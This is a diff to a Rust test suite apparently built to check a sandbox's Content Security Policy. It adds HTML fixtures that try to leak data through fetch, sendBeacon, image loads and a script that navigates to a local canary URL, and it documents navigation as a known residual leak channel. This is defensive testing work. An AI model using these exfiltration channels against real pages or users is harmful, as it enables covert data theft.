@@ -56,6 +56,10 @@ static FIXTURES: &[Fixture] = &[
         slug: "pm-abuse",
         html: PM_ABUSE,
     },
+    Fixture {
+        slug: "nav-exfil",
+        html: NAV_EXFIL,
+    },
 ];
 
 /// Benign home artifact — renders text, loads a base lib over the named host
@@ -107,6 +111,9 @@ const EXFIL: &str = r#"<!doctype html>
 
   tryCh("fetch", function () { fetch(canary + "?c=fetch", { mode: "no-cors" }); });
   tryCh("fetch-external", function () { fetch(external + "?c=fetchext", { mode: "no-cors" }); });
+  // Self-host fetch (relative → the artifact's own named host). connect-src
+  // 'none' must block even this — proving the boundary isn't 'self'/host-scoped.
+  tryCh("fetch-self-host", function () { fetch("/api/pads?c=selfhost", { mode: "no-cors" }); });
   tryCh("sendBeacon", function () { if (navigator.sendBeacon) navigator.sendBeacon(canary + "?c=beacon", "x"); });
   tryCh("img", function () { var i = new Image(); i.src = canary + "?c=img"; document.body.appendChild(i); });
   tryCh("img-external", function () { var i = new Image(); i.src = external + "?c=imgext"; document.body.appendChild(i); });
@@ -211,6 +218,27 @@ const PM_ABUSE: &str = r#"<!doctype html>
   send({ type: "navigate", slug: "eval" });
   var result = { kind: "pm-abuse", sent: true };
   window.__gpResult = result;
+})();
+</script>
+</body></html>
+"#;
+
+/// Navigation-exfil probe — documents the **accepted residual channel**
+/// (design.md §4/§9): no CSP directive stops a document from navigating its own
+/// browsing context, so `location.href = external` leaks via the URL. The suite
+/// asserts the canary *does* receive this (proving the suite is honest about the
+/// limitation) — the mitigation is the trusted parent restoring the expected
+/// document on unexpected navigation (Wave 4), not CSP.
+const NAV_EXFIL: &str = r#"<!doctype html>
+<html><head><meta charset="utf-8"><title>Nav exfil (residual)</title></head><body>
+<h1>Navigation exfil — documented residual channel</h1>
+<script>
+(function () {
+  var params = new URLSearchParams((location.hash || "").replace(/^#/, ""));
+  var canaryPort = params.get("canary");
+  if (canaryPort) {
+    location.href = "http://127.0.0.1:" + canaryPort + "/leak?via=navigation";
+  }
 })();
 </script>
 </body></html>
